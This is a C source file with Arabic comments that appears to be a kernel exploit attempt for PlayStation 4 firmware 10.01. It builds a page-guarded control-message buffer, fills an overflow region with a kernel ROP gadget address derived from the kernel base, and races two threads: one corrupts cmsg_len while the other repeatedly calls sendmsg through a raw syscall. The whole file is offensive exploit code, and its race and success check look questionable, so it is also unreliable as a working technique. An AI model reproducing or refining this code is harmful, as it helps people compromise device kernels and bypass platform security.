#include <ps4.h>

// --- تعريف الهياكل المفقودة يدوياً لضمان النجاح في الترجمة ---
struct cmsghdr {
    uint32_t cmsg_len;
    int      cmsg_level;
    int      cmsg_type;
};

struct iovec {
    void  *iov_base;
    size_t iov_len;
};

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    struct iovec *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

// تعريف الثوابت المفقودة
#define MAP_ANONYMOUS 0x1000
#ifndef MAP_PRIVATE
    #define MAP_PRIVATE 0x0002
#endif

// --- إعدادات الذاكرة لـ PS4 ---
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 256 
#define NCMSG         14

// الإزاحات لنسخة 10.01
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;

// --- 1. بناء البفر الجراحي ---
void BuildPrecisionBuffer(uint64_t kbase) {
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);

    // استخدام MAP_ANONYMOUS | MAP_PRIVATE
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (BaseArea == (uint8_t *)-1) {
        return;
    }

    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_level = 0;
        ControlBuf[i].cmsg_type = 7;
    }

    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    
    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }
}

// --- 2. خيط التخريب (The Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg; // منع تحذير unused parameter
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i=0; i<50; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i=0; i<50; i++);
    }
    return NULL;
}

// --- 3. خيط التنفيذ (The Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    while (!stop_race) {
        n_tries++;
        // استخدام السيسكال المباشر لـ sendmsg
        int ret = syscall(28, bad_fd, &msg, 0);
        
        if (ret == -1 && errno == 14) { 
            stop_race = 1;
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();
    initSysUtil();

    uint64_t kbase = get_kernel_base();
    printf_debug("[+] KBase: 0x%llx\n", kbase);

    BuildPrecisionBuffer(kbase);

    ScePthread wrid, exid;
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    printf_debug("[***] SUCCESS: EFAULT detected.\n");
    return 0;
}
